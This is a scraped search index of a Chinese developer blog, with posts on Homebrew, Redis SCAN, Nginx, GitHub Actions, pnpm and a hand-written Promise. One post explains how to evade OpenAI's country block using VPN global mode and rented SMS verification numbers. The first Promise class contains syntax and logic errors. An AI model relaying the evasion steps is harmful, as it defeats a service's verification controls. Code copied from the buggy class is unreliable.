homebrew/cask)\u0026quot; remote set-url origin 'https://mirrors.ustc.edu.cn/homebrew-cask.git' 报错，可能是因为 Homebrew Cask 未安装或安装位置不在预期的目录中导致的。\n解决:\n# 第1步: 检查目录 # 检查目录是否存在 $ ls /usr/local/Homebrew/Library/Taps/homebrew/ # 确保该命令后，存在\u0026#39;homebrew-cask\u0026#39; # \u0026#39;homebrew-cask\u0026#39;不存在，需重新添加 $ brew tap homebrew/cask # 第2步: 更新 $ brew update $ brew upgrade 参考 Homebrew 安装、使用、升级和卸载 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/mac-homebrew/","summary":"\u003cp\u003e\u003ccode\u003eHomebrew\u003c/code\u003e是使用 Mac OS 的一件利器，\u003ccode\u003eHomebrew\u003c/code\u003e可以安装 \u003ccode\u003eApple\u003c/code\u003e没有预装但非常\u0026hellip;\u003c/p\u003e","title":"工具: Homebrew"},{"content":"从春节前就开始酝酿的ChatGPT最近大火，接下来就给大家梳理一下注册的过程\u0026hellip;\n一、注册使用 1、科学上网 节点需要【国外】，不能选择香港和台湾。免费的科学上网教程。\n有条件的，还是尽量使用自己的稳定VPN。\n2、chatGPT账号注册 打开 官网注册 使用国外邮箱注册chatGPT账号，依次输入邮箱和密码。 如gmail、outlook、iCloud邮箱等，建议使用【Google邮箱】 3、注册成功，验证chatGPT账号 —— 短信接码平台 注册成功后会进入【验证手机号】页面，选择你【下一步短信平台的接码的手机国家】 建议不要选择印度或印尼等东南亚地区，有时候会接收不到验证码。德法等国家虽然价格稍贵，但相对稳定。\n注册 sms-activate（短信接码平台），并进行账号充值。 建议选择【支付宝】方式充值【1美元】，支付完成可能要等几分钟才显示到余额账户，我在注册时也是等了一会才显示余额。\n短信接码平台，左侧搜索或直接点击OpenAI标识，选择对应国家或地区。 图下919862209703就是你可以接码的号码，复制号码到OpenAI验证码界面\n如果没有收到验证码，你可以多试几次，没收到码可以在有效期内免费退一次。\n输入接码号码，点击【send code】。\n注册完就可以去登录 https://chat.openai.com/auth/login\n二、注意事项 1.验证码平台 注意要选好对应的国家。例如你获取的是印度，在chatGPT填写的时候，要选择印度 填写手机号，直接复制【接码平台】提供的手机号。若不能正常接码，则尝试去除【复制的号码中】重复的国家区号 接码手机的国家尽量不要选择印度等东南亚地区，有时候会接收不到验证码 2.ChatGPT - OpenAI账号注册 选择国外的节点IP，不能选择香港和台湾 打开全局模式，不要使用Pac模式。否则Chrome容易被标记为国内，国内并不支持OpenAI账号注册，提示：OpenAI's services are not available in your country. 作为对上一条的补充，【注册】过程建议使用【无痕模式】。 拓展内容 ChatGPT使用示例 如何编程调用OpenAI的ChatGPT API接口 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/chatgpt-registeranduse/","summary":"\u003cp\u003e从春节前就开始酝酿的\u003ccode\u003eChatGPT\u003c/code\u003e最近大火，接下来就给大家梳理一下注册的过程\u0026hellip;\u003c/p\u003e","title":"ChatGPT（OpenAI）注册及使用"},{"content":"对于经常写作记录的同学，图床非常舒服，不仅可以节省写作导入图片的时间，同时保障做好一张图的情况下在多个文档场景使用\u0026hellip;\n几年亲身体验告诉大家，Github做图床十分靠谱，有CDN加速访问巨快，今天有时间把流程整理出来。\n建议使用Github替换Gitee，一是Gitee受限于各种原因，经常会在你使用中出现各种幺蛾子，你不得不补充各种资料。二是Github提供了CDN加速，所以Gitee在国内访问较快的优势也失去了。\n一、使用GitHub搭建图床 1.前提条件: 图床仓库 右上角的”加号“点击『New repository』新建一个仓库 仓库必须是public的，否则存储的图片不能正常访问 2.设置Personal access tokens 若你不需要使用picGo等图片管理工具，上传管理图片。则此步骤可以忽略。\n这里选择创建personal access token (classic)，详情参考 创建个人访问令牌 - GitHub Docs。\n依次配置:\nNote：给令牌一个描述性名称 Expiration：令牌提供到期时间 repo：要授予此令牌的作用域 注意，生成的token只会在这里显示一次，所以记得单独保存下来哦 至此，Github的配置完成。\n二、快速上传图片及如何使用 1.PicGo快速上传图片 若你不需要使用picGo等图片管理工具，上传管理图片。则此步骤可以忽略。\n由于国内下载PicGo速度非常慢，给大家推荐一个镜像地址下载。\n这个下载地址要打开vpn访问。下载地址：Index of /github-release/Molunerfinn_PicGo/v2.3.0/ (sdu.edu.cn)。\n如我使用的是Mac64位系统，可通过uname -a命令查看。 点击 PicGo-2.3.1-x64.dmg 查看\n选择对应的版本，即可下载安装。\nMac选择版本疑问参考：Mac电脑使用：判断ARM64 or x64的方法\n配置PicGo:\n仓库名：[github用户名]/[第一步新建的仓库名称] 分支：默认master，从2020.10.01开始，github的默认分支名变更为main 设定token：第一步创建的token 指定存储路径：可填可不填。填写了，图片就会存储在img文件夹下 设定自定义域名：https://cdn.jsdelivr.net/gh/[github用户名]/[仓库名]@main，注意，此处的分支一定要填写@main，否则默认使用master分支，会出现图片不能上传的情况。【踩坑】 至此，github+picGo的配置完成，可以在上传区进行图片上传。\n2.如何使用 2.1 使用图床 模板：https://cdn.jsdelivr.net/gh/用户名/仓库名@分支/图片路径\n例如：https://cdn.jsdelivr.net/gh/lianpf/image-bed@main/blog/2023/test.png\n原github的自定义域名是：https://raw.githubusercontent.com/[username]/[仓库名]。但这种方式访问图片巨慢，所以教程中使用了jsdelivr作为cdn加速。\n总结 如果你像我一样，不想使用客户端上传图片，或者在图床仓库设置了多文件夹分类图片，那你可以直接通过git管理仓库，那么你需要做的就只有两步。\n创建【图床仓库】，上传图片资源。 使用模板路径：https://cdn.jsdelivr.net/gh/用户名/仓库名@分支/图片路径，配置访问你的图片资源。 参考 使用Github+picGo搭建图床，保姆级教程来了 | 知乎 如何使用GitHub搭建图床 | 微公众 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/github-image-bed/","summary":"\u003cp\u003e对于经常写作记录的同学，图床非常舒服，不仅可以节省写作导入图片的时间，同时保障做好一张图的情况下在多个文档场景使用\u0026hellip;\u003c/p\u003e","title":"ImageBed:使用GitHub搭建图床"},{"content":"1. 介绍 scan命令的作用和keys *的作用类似，主要用于查找redis中的键，但是在正式的生产环境中一般不会直接使用keys *这个命令，因为他会返回所有的键，如果键的数量很多会导致查询时间很长，进而导致服务器阻塞，所以需要scan来进行更细致的查找\nscan总共有这几种命令：scan、sscan、hscan、zscan，分别用于迭代数据库中的：数据库中所有键、集合键、哈希键、有序集合键，命令具体结构如下：\nscan cursor [MATCH pattern] [COUNT count] [TYPE type] sscan key cursor [MATCH pattern] [COUNT count] hscan key cursor [MATCH pattern] [COUNT count] zscan key cursor [MATCH pattern] [COUNT count] 2. scan scan cursor [MATCH pattern] [COUNT count] [TYPE type]，cursor表示游标，指查询开始的位置，count默认为10，查询完后会返回下一个开始的游标，当返回0的时候表示所有键查询完了\n127.0.0.1:6379[2]\u0026gt; scan 0 1) \u0026#34;3\u0026#34; 2) 1) \u0026#34;mystring\u0026#34; 2) \u0026#34;myzadd\u0026#34; 3) \u0026#34;myhset\u0026#34; 4) \u0026#34;mylist\u0026#34; 5) \u0026#34;myset2\u0026#34; 6) \u0026#34;myset1\u0026#34; 7) \u0026#34;mystring1\u0026#34; 8) \u0026#34;mystring3\u0026#34; 9) \u0026#34;mystring4\u0026#34; 10) \u0026#34;myset\u0026#34; 127.0.0.1:6379[2]\u0026gt; scan 3 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;myzadd1\u0026#34; 2) \u0026#34;mystring2\u0026#34; 3) \u0026#34;mylist2\u0026#34; 4) \u0026#34;myhset1\u0026#34; 5) \u0026#34;mylist1\u0026#34; MATCH可以采用模糊匹配找出自己想要查找的键，这里的逻辑是先查出20个，再匹配，而不是先匹配再查询，这里加上count 20是因为默认查出的10个数中可能不能包含所有的相关项，所以把范围扩大到查20个，我这里测试的键总共有15个\n127.0.0.1:6379[2]\u0026gt; scan 0 match mylist* count 20 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;mylist\u0026#34; 2) \u0026#34;mylist2\u0026#34; 3) \u0026#34;mylist1\u0026#34; TYPE可以根据具体的结构类型来匹配该类型的键\n127.0.0.1:6379[2]\u0026gt; scan 0 count 20 type list 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;mylist\u0026#34; 2) \u0026#34;mylist2\u0026#34; 3) \u0026#34;mylist1\u0026#34; 3. sscan sscan key cursor [MATCH pattern] [COUNT count]，sscan的第一个参数总是集合类型的key\n127.0.0.1:6379[2]\u0026gt; sadd myset1 a b c d (integer) 4 127.0.0.1:6379[2]\u0026gt; smembers myset1 1) \u0026#34;d\u0026#34; 2) \u0026#34;a\u0026#34; 3) \u0026#34;c\u0026#34; 4) \u0026#34;b\u0026#34; 127.0.0.1:6379[2]\u0026gt; sscan myset1 0 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;d\u0026#34; 2) \u0026#34;c\u0026#34; 3) \u0026#34;b\u0026#34; 4) \u0026#34;a\u0026#34; 127.0.0.1:6379[2]\u0026gt; sscan myset1 0 match a 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;a\u0026#34; 4. hscan hscan key cursor [MATCH pattern] [COUNT count]，sscan的第一个参数总是哈希类型的key\n127.0.0.1:6379[2]\u0026gt; hset myhset1 kk1 vv1 kk2 vv2 kk3 vv3 (integer) 3 127.0.0.1:6379[2]\u0026gt; hgetall myhset1 1) \u0026#34;kk1\u0026#34; 2) \u0026#34;vv1\u0026#34; 3) \u0026#34;kk2\u0026#34; 4) \u0026#34;vv2\u0026#34; 5) \u0026#34;kk3\u0026#34; 6) \u0026#34;vv3\u0026#34; 127.0.0.1:6379[2]\u0026gt; hscan myhset1 0 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;kk1\u0026#34; 2) \u0026#34;vv1\u0026#34; 3) \u0026#34;kk2\u0026#34; 4) \u0026#34;vv2\u0026#34; 5) \u0026#34;kk3\u0026#34; 6) \u0026#34;vv3\u0026#34; 5. zscan zscan key cursor [MATCH pattern] [COUNT count]，sscan的第一个参数总是有序集合类型的key\n127.0.0.1:6379[2]\u0026gt; zadd myzadd1 1 zz1 2 zz2 3 zz3 (integer) 3 127.0.0.1:6379[2]\u0026gt; zrange myzadd1 0 -1 withscores 1) \u0026#34;zz1\u0026#34; 2) \u0026#34;1\u0026#34; 3) \u0026#34;zz2\u0026#34; 4) \u0026#34;2\u0026#34; 5) \u0026#34;zz3\u0026#34; 6) \u0026#34;3\u0026#34; 127.0.0.1:6379[2]\u0026gt; zscan myzadd1 0 1) \u0026#34;0\u0026#34; 2) 1) \u0026#34;zz1\u0026#34; 2) \u0026#34;1\u0026#34; 3) \u0026#34;zz2\u0026#34; 4) \u0026#34;2\u0026#34; 5) \u0026#34;zz3\u0026#34; 6) \u0026#34;3\u0026#34; ","permalink":"https://lianpf.github.io/posts/tech/tech1/","summary":"1. 介绍 scan命令的作用和keys *的作用类似，主要用于查找","title":"Redis scan命令学习"},{"content":"一些GitHub上或Gitee值得关注的开源项目或组织\u0026hellip;\n一、组织 Google Google | GitHub 腾讯 腾讯AlloyTeam - web前端团队 | GitHub 百度 Baidu Baidu FEX team - 前端团队 | GitHub 阿里系 饿了么 饿了么前端 中通快递 ZTO-Express | GitHub 二、明星项目 1.后端视角 2.前端视角 React相关 react-component：基于react的组件 styled-components：css-in-js、React Demo示例 react-pxq: react16 + redux 的完整项目（基于生命周期和Class Component） 数据可视化 ThreeJS CSS classnames Webpack相关 webpack-contrib: webpack loader、plugin等 webpack-bundle-analyzer: analyze、bundle 跨端 taro: 多端统一开发框架、React 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/github-star-project-and-org/","summary":"\u003cp\u003e一些\u003ccode\u003eGitHub上\u003c/code\u003e或\u003ccode\u003eGitee\u003c/code\u003e值得关注的开源项目或组织\u0026hellip;\u003c/p\u003e","title":"GitHub和Gitee明星项目及组织"},{"content":"Nginx中常用的配置记录\u0026hellip;\n一、只允许域名访问禁止ip访问 参考：Nginx只允许域名访问禁止ip访问\n配置Nginx只允许域名访问而禁止IP访问，可使用以下配置:\n# 第一个server中配置允许访问的域名，即example.com # 在location / 中，可以配置当前网站的具体内容和配置 server { listen 80; server_name example.com; # 配置域名访问 location / { # your website configuration } } # 禁止 IP 访问 # 第二个server是默认的虚拟主机，监听所有没有在其他虚拟主机中定义的请求 # 通过 server_name _ 指定该虚拟主机应该处理所有没有匹配到其他虚拟主机的请求 server { listen 80 default_server; server_name _; deny all; # 通过deny all指令禁止所有请求，包括IP访问和域名访问 # 这样，只有在第一个虚拟主机中配置的域名才能被访问，而IP访问将被禁止 } 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/nginx-commonconf/","summary":"\u003cp\u003e\u003ccode\u003eNginx\u003c/code\u003e中常用的配置记录\u0026hellip;\u003c/p\u003e","title":"Nginx: Common Conf（场景化常用配置）"},{"content":"随着项目的增多，依赖项与项目的数量成正比。使用pnpm在磁盘上节省大量空间，且安装速度要快得多\u0026hellip;\n背景 当使用 npm 或 Yarn 时，如果你有 100 个项目使用了某个依赖（dependency），就会有 100 份该依赖的副本保存在硬盘上。 而在使用 pnpm 时，依赖会被存储在内容可寻址的存储中，所以：\n如果你用到了某依赖项的不同版本，只会将不同版本间有差异的文件添加到仓库。 例如，如果某个包有100个文件，而它的新版本只改变了其中1个文件。那么 pnpm update 时只会向存储中心额外添加1个新文件，而不会因为仅仅一个文件的改变复制整新版本包的内容。 所有文件都会存储在硬盘上的某一位置。 当软件包被被安装时，包里的文件会硬链接到这一位置，而不会占用额外的磁盘空间。 这允许你跨项目地共享同一版本的依赖。 因此，您在磁盘上节省了大量空间，这与项目和依赖项的数量成正比，并且安装速度要快得多！\n一、基础用法 1.安装 // 通过 npm 安装 npm install -g pnpm // 如果您安装了包管理器，则可以使用以下命令安装 pnpm brew install pnpm 二、其他 待补充\u0026hellip;\n参考 pnpm 官方文档 转转的CI系统和开发环境为什么要从npm切换到pnpm 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/npm-package-pnpm/","summary":"\u003cp\u003e随着项目的增多，依赖项与项目的数量成正比。使用\u003ccode\u003epnpm\u003c/code\u003e在磁盘上节省大量空间，且安装速度要快得多\u0026hellip;\u003c/p\u003e","title":"Node: npm包管理之pnpm"},{"content":"一个用于修改ajax请求响应的chrome扩展\u0026hellip;\nAjax Interceptor是一个用于修改ajax请求响应的chrome扩展，Mock修改ajax请求的返回结果。\n一、背景和安装 使用背景：\n服务端数据不符合预期，简单Mock，测试一些边界值 复现Bug，快速定位问题 安装：\nChrome应用商店中搜索Ajax Interceptor 传送门 二、使用 第一步：在扩展程序中打开Ajax Interceptor\n点击上图红色商店icon 打开绿色Ajax Interceptor应用标识 第二步：替换request请求响应内容\n点击扩展程序Ajax Interceptor标识，弹出如下操作界面： 配置拦截的url或url 正则 将链接的响应内容粘贴入Replace With中，进行修改编辑（可点击JSON Editor修改数据） 保存 刷新页面，查看效果 三、其他应用: Ajax Proxy Ajax Proxy: https://blog.csdn.net/wl18271672781/article/details/125432559\n参考 Ajax Interceptor使用 官方视频教程 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/09.ajax-interceptor/","summary":"\u003cp\u003e一个用于修改\u003ccode\u003eajax\u003c/code\u003e请求响应的\u003ccode\u003echrome\u003c/code\u003e扩展\u0026hellip;\u003c/p\u003e","title":"抓包工具: Ajax Interceptor（Ajax 拦截）"},{"content":"\u0026lt;div\u0026gt; 科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 \u0026lt;/div\u0026gt; ","permalink":"https://lianpf.github.io/posts/tech/tech/","summary":"\u0026lt;div\u0026gt; 科技代码科技代码科技代码科技代码科技代码科技代码科技代码科","title":"Tech"},{"content":"持续集成由很多操作组成，比如抓取代码、运行测试、登录远程服务器，发布到第三方服务等等。GitHub把这些操作就称为actions\u0026hellip;\n一、GitHub Actions介绍及使用 1.基本概念 GitHub Actions的术语：\nworkflow（工作流程）：持续集成一次运行的过程，就是一个workflow job（任务）：一个workflow由一个或多个jobs构成，含义是一次持续集成的运行，可以完成多个任务 step（步骤）：每个job由多个step构成，一步步完成 action（动作）：每个step可以依次执行一个或多个命令action 2.基本使用 每个action就是一个独立脚本，可做成代码仓库，使用userName/repoName的语法引用action\n比如，actions/setup-node就表示仓库github.com/actions/setup-node，代表一个作用是安装Node.js的action。GitHub官方的actions都放在github.com/actions里。注意，Action有版本的概念。\nactions/setup-node@74bc508 # 指向一个 commit actions/setup-node@v1.0 # 指向一个标签 actions/setup-node@master # 指向一个分支 3.资源 基本概念和基础使用\n参考：GitHub Actions 入门 | 阮一峰 搜索到他人提交的actions\nGitHub Action 官方市场 awesome-actions 二、常用的GitHub Action 1. 准备workspace，便于整个工作流访问 actions/checkout@v2 | 官方 适用于Node12版本。对于Node20+版本，要升级到 actions/checkout@v3 peaceiris/actions-hugo@v2: 负责准备安装hugo打包构建环境 peaceiris/actions-gh-pages@v3: 实现hugo环境下构建和发布 参考 peaceiris/actions-gh-pages\nHub Mirror Action | Yikun 2. 完成lianpf用户下despository，从github到gitee的同步 Gitee Pages Action | yanglbme 在不使用Git Pages Pro的前提下，实现Gitee Pages的自动部署\n参考 GitHub Actions 入门 | 阮一峰 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/github-actions-common/","summary":"\u003cp\u003e持续集成由很多操作组成，比如抓取代码、运行测试、登录远程服务器，发布到第三方服务等等。\u003ccode\u003eGitHub\u003c/code\u003e把这些操作就称为\u003ccode\u003eactions\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"工具: 常用的GitHub Actions"},{"content":" 一、Promise的使用 创建一个promise实例，方便处理异步操作\nvar p = new Promise(function(resolve,reject){ setTimeout(function(){ resolve(\u0026#34;success\u0026#34;) },1000); console.log(\u0026#34;创建一个新的promise\u0026#34;); }) p.then(function(x){ console.log(x) }) // 输出：创建一个新的promise // 输出：success promise.then()链式调用\nvar p = new Promise(function(resolve, reject) { resolve() }); p.then(...).then(...).then(...) 其他方法：\nPromise.resolve() Promise.all() Promise.race() 二、Promise原理剖析 1.Promise 凭借什么消灭了回调地狱 2.为什么Promise要引入微任务 3.Promise 如何实现链式调用 正文。。。\n三、手写Promise/A+规范的Promise Promise/A+规范： 『术语』：\npromise是一个对象或者函数，该对象或者函数有一个then方法 thenable是一个对象或者函数，用来定义then方法 value是promise状态成功时的值 reason是promise状态失败时的值 要求：\npromise必须有3个状态，pending、fulfilled(resolved)和rejected 当处于pending状态的时候，可以转移到fulfilled(resolved)或rejected状态 当处于fulfilled(resolved)状态或rejected状态的时候，则不可变 一个promise必须有一个then方法 then方法接受两个参数：promise.then(onFulfilled, onRejected) onFulfilled方法表示状态从pending——\u0026gt;fulfilled(resolved)时所执行的方法 onRejected表示状态从pending——\u0026gt;rejected所执行的方法。 为了实现链式调用，then方法必须返回一个promise。promise2=promise1.then(onFulfilled,onRejected) 1.Promise基础结构 执行回调数组：当resolve()延迟执行时，Promise的状态为pending，不应立即执行成功调用的函数，需要把它存起来，直到执行resolve再执行成功调用的函数 链式调用：Promise里的链接调用是返回一个新的Promise对象 异步执行：用setTimeout模拟微任务（JS事件循环执行顺序上和原生Promise有区别），把回调放入，等待确保异步执行 基础Promise：\nconst isFunction = variable =\u0026gt; typeof variable === \u0026#39;function\u0026#39; // 定义三个常量表示状态 const PENDING = \u0026#39;pending\u0026#39; const FULFILLED = \u0026#39;fulfilled\u0026#39;, const REJECTED = \u0026#39;rejected\u0026#39; class MyPromise { constructor(func) { this.onFulfilledArray = [] // 成功回调数组 this.onRejectedArray = [] // 失败回调数组 this.value = void 0 this.reason = void 0 this.status = PENDING func(this.resolve.bind(this), this.reject.bind(this)) } resolve(val) { if (this.status !== PENDING) return const self = this const doResolve = () =\u0026gt; { if (self.status === PENDING) { self.status = FULFILLED self.value = val // resolve里面将所有成功的回调拿出来执行 while (self.onFulfilledArray.length) { const fn = self.onFulfilledArray.shift() fn() } } } setTimeout(doResolve(), 0) } reject(err) { if (this.status !== PENDING) return const self = this const doReject = () =\u0026gt; { if (self.status === PENDING) { self.status = REJECTED self.reason = err // resolve里面将所有失败的回调拿出来执行 self.onRejectedArray.forEach(fn =\u0026gt; { fn() }) } } setTimeout(doReject, 0) } then(onFulfilled, onRejected) { let nextPromise = void 0 switch (this.status) { case PENDING: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { this.onFulfilledArray.push(() =\u0026gt; { try { let res = onFulfilled(self.value) resolve(res) } catch (error) { reject(error) } }) this.onRejectedArray.push(() =\u0026gt; { try { let res = onRejected(self.reason) resolve(res) } catch (e) { reject(e) } }) }) break case FULFILLED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = onFulfilled(self.value) resolve(res) } catch (e) { reject(e) } }) break case REJECTED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = onRejected(self.reason) resolve(res) } catch (e) { reject(e) } }) onRejected(self.reason) break } return nextPromise } catch(err) { // 默认没有成功，只有失败 return this.then(void 0, err) } } 2.链式调用进阶版 以上的Promise存在一个问题，如果链式调用中Promise返回的是普通值，应该把值包装成新的Promise对象\n要求：\n每个then方法都返回一个新的Promise对象（重点） 如果then方法返回了一个Promise对象，则需要查看它的状态 如果状态是成功，则调用resolve方法，把成功的状态传递给它； 如果是失败的，则把失败的状态传递给下一个Promise对象 如果then方法中返回的是一个原始数据类型值（如 Number、String 等）就使用此值包装成一个新的Promise对象返回 如果then方法中没有return语句，则返回一个用undefined包装的Promise对象 如果 then 方法没有传入任何回调，则继续向下传递（值的传递特性） 如果是循环引用则需要抛出错误 修改then方法，增加resolvePromise函数\n... function resolvePromise(x, nextPromise, resolve, reject) { // 处理三种情况： // 1.循环引用 // 2.x 为MyPromise // 3.x为基础类型 if (x === nextPromise) { // x 和 nextPromise 指向同一对象，循环引用抛出错误。防止死循环 return reject(new TypeError(\u0026#39;循环引用\u0026#39;)) } else if (x \u0026amp;\u0026amp; (typeof x === \u0026#39;object\u0026#39; || isFunction(x))) { // x 是对象或者函数 let called = false // 避免多次调用 try { let then = x.then // 判断对象是否有 then 方法 if (isFunction(then)) { // then 是函数，就断定 x 是一个 MyPromise（根据Promise A+规范） then.call( x, function(y) { // 调用返回的MyPromise，用它的结果作为下一次then的结果 if (called) return called = true resolvePromise(y, nextPromise, resolve, reject) // 递归解析成功后的值，直到它是一个普通值为止 }, function(r) { if (called) return called = true reject(r) // 取then时发生错误了 } ) } else { resolve(x) // 此时，x是一个普通对象 } } catch (e) { reject(e) } } else { // x 是原始数据类型 / 没有返回值，这里即是undefined resolve(x) } } class MyPromise { constructor(func) { ... } ... then(onFulfilled, onRejected) { const self = this // 如果onFulfilled不是函数，给一个默认函数，返回value let realOnFulfilled = onFulfilled if (!isFunction(realOnFulfilled)) realOnFulfilled = value =\u0026gt; value let realOnRejected = onRejected if (!isFunction(onRejected)) { realOnRejected = reason =\u0026gt; { if (reason instanceof Error) { throw reason } else { throw new Error(reason) } } } let nextPromise = void 0 switch (this.status) { case PENDING: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { this.onFulfilledArray.push(() =\u0026gt; { try { let res = realOnFulfilled(self.value) resolvePromise(res, nextPromise, resolve, reject) // resolve(res) } catch (error) { reject(error) } // onFulfilled(self.value) }) this.onRejectedArray.push(() =\u0026gt; { try { let res = realOnRejected(self.reason) resolve(res) } catch (e) { reject(e) } // onRejected(self.reason) }) }) break case FULFILLED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = realOnFulfilled(self.value) resolvePromise(res, nextPromise, resolve, reject) } catch (e) { reject(e) } }) // onFulfilled(self.value) break case REJECTED: nextPromise = new MyPromise((resolve, reject) =\u0026gt; { try { let res = realOnRejected(self.reason) resolvePromise(res, nextPromise, resolve, reject) } catch (e) { reject(e) } }) onRejected(self.reason) break } return nextPromise } ... } 3.Promise.prototype.finally实现 有两大重点:\n无论当前这个 Promise 对象最终的状态是成功还是失败 ,finally 方法里的回调函数都会执行一次 在 finally 方法后面可以继续链式调用 then 方法，拿到当前这个 Promise 对象最终返回的结果 挂载在MyPromise.property原型上，或者类似catch实现：\nMyPromise.prototype.finally = function(callback) { return this.then( data =\u0026gt; { return MyPromise.resolve(callback()).then(() =\u0026gt; data) }, err =\u0026gt; { return MyPromise.resolve( callback().then(() =\u0026gt; { throw err }) ) } ) } 4.Promise.all()和Promise.race()实现 Promise.all()：可将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值\n... function isPromise(val) { return val \u0026amp;\u0026amp; typeof val.then === \u0026#39;function\u0026#39; } class MyPromise() { ... } ... MyPromise.all = function(promises) { if (!Array.isArray(promises)) { throw new Error(\u0026#39;Not a array\u0026#39;) } return new MyPromise((resolve, reject) =\u0026gt; { let result = [] let times = 0 // 计数器 function processData(index, val) { result[index] = val if (++times === promises.length) { resolve(result) } } for (let i = 0; i \u0026lt; promises.length; i++) { let p = promises[i] if (isPromise(p)) { // MyPromise对象 p.then(data =\u0026gt; { processData(i, data) }, reject) } else { processData(i, p) // 普通值 } } }) } Promise.race()在执行多个异步操作中，不管结果是成功状态还是失败状态，只保留取第一个执行完成的异步操作的结果。其他的方法仍会执行，但结果会被抛弃\n... class MyPromise() { ... } ... MyPromise.race = function(promises) { if (!Array.isArray(promises)) { throw new Error(\u0026#39;Not a array\u0026#39;) } return new MyPromise((resolve, reject) =\u0026gt; { if (promises.length === 0) { return } else { for (let p of promises) { p.then( value =\u0026gt; { resolve(value) }, reason =\u0026gt; { reject(reason) } ) } } }) } 5.最终手写版源码 代码太长，直接参考源码仓库 examples | lianpf.github。欢迎star\n参考 思路很清晰的两篇文章：\nES6系列之手写Promise 手写Promise/A+ | ES5 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-async-promise/","summary":"一、Promise的使用 创建一个promise实例，方便处理","title":"JavaScript: 异步编程之Promise"},{"content":"Mac日常或者办公软件的使用\u0026hellip;\n一、日常 1.微信（双开） Terminal输入：\n$ nohup /Applications/WeChat.app/Contents/MacOS/WeChat \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; 来源：Apple社区\n二、工作 1.录屏 QuickTime Player：Mac自带录屏软件 2.Gif 推荐使用licecap制作Gif\n屏幕录制 + gif图片制作 QuickTime Player屏幕录制 PicGIF下载或aconvert在线网站制作 开源LICEcap制作Gif 安装 licecap licecap使用 三、lianpf Mac Pro Software 日常工具：词典、日历、提醒事项、备忘录、计算器 Social Network：QQ、微信 Music：QQ 音乐、网易云音乐 Browser：Google Chrome、Safari、Firefox Developer Tools：Visual Studio Code、字节跳动开发者工具、微信开发者工具、Xcode、MongoDB Compass、Sequel Pro Config Tools：SwitchHosts!、Charles、调度中心、SourceTree、Postman、Chrome APPs \u0026amp; Extensions Developer Tool、PicGo VPN Tools：Shadowsocks、V2rayU、EasyConnect Office：Pages、Numbers、Keynote Work 工具：有道云笔记、XMind、MindNode、Foxmail、宝盒、钉钉、LICEcap 网盘：百度网盘、阿里网盘 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 